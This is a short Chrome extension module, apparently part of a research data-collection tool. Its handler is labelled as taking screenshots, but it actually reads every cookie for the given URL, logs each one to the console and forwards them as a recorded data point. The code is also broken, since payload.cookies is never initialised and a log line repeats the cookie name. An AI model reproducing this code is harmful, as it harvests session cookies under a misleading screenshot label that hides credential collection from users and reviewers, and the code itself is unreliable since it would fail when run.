/* global chrome, handleMessage, registerCustomModule, registerMessageHandler */

const recordScreenshot = function (request, sender, sendResponse) {
  if (request.content === 'take_screenshot') {
    const top = request.top
    const left = request.left
    const width = request.width
    const height = request.height

    console.log('[Screenshot] Recording screenshot for ' + request.url + ' at region (' + top + ', ' + left + ' - ' + width + 'x' + height + '...')

    const payload = {
      'url*': request.url,
      'page-title*': request.pageTitle
    }

    chrome.cookies.getAll({
      url: request.url
    },
    function (cookies) {
      cookies.forEach(function (cookie) {
        console.log(cookie.name + ' --> ' + cookie.name)
        console.log(cookie)

        payload.cookies.push(cookie)
      })

      if (payload.cookies.length > 0) {
        const newRequest = {
          content: 'record_data_point',
          generator: 'browser-cookies',
          payload: payload // eslint-disable-line object-shorthand
        }

        handleMessage(newRequest, sender, sendResponse)
      }
    })

    return true
  }

  return false
}

registerCustomModule(function (config) {
  console.log('[Screenshot] Initialized.')

  registerMessageHandler('take_screenshot', recordScreenshot)
})
